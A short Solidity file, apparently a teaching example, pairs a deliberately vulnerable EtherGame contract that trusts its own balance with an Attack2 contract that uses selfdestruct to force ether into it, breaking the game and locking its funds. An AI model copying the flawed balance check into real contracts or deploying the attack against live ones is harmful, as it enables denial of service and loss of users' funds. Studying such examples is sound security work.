// SPDX-License-Identifier: MIT
import "hardhat/console.sol";
pragma solidity ^0.8.0;

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winter;

    function deposit() public payable {
        require(msg.value == 1 ether, "only can send 1 ether");

        uint balance = address(this).balance;
        console.log(balance);
        require(balance <= targetAmount, "game over");

        if (balance == targetAmount) {
            winter = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winter, "only winer");

        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "failed to send Ether");
    }
}

contract Attack2 {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}